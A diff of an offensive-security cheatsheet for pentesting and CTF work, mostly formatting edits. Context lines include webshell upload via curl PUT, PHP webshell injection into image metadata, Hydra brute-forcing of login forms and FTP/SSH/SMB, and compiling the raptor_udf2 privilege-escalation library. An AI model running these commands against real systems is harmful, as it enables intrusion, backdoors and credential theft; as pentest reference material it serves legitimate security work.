@@ -1,6 +1,10 @@
-# 1 Offensive Security / PenTesting Cheatsheets
+---
+description: >-
+  A collection of offensive security cheatsheets, convenience functions, scripts
+  and other useful goodies to aid during pentest engagement and CTF challenges.
+---
 
-A collection of offensive security cheatsheets, convenience functions, scripts and other useful goodies to aid during pentest engagement and CTF challenges.
+# Offensive Security / PenTesting Cheatsheets
 
 ## Reconnaissance / Enumeration
 
@@ -179,6 +183,10 @@ xterm -display 10.0.0.1:1
 ssh bill@localhost ls -l /tmp
 ```
 
+```bash
+nice /bin/bash
+```
+
 ### Uploading/POSTing Files Through WWW Upload Forms
 
 ```bash
@@ -213,7 +221,7 @@ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 
 ### Injecting php webshell into JPEG
 
-```text
+```bash
 exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
 exiftool “-comment<=back.php” back.png
 ```
@@ -229,15 +237,13 @@ AddType application/x-httpd-php .blah
 #### Cracking Web Forms with Hydra
 
 ```bash
-hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list 
-`
+hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
 ```
 
 #### Cracking Common Protocols with Hydra
 
 ```bash
 hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
-`
 ```
 
 #### HashCat Cracking
@@ -375,7 +381,7 @@ php -S 0.0.0.0:80
 
 Requires [raptor\_udf2.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor_udf2.c) and [sid-shell.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c) or [full tarball](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor/raptor.tar)
 
-```text
+```bash
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 
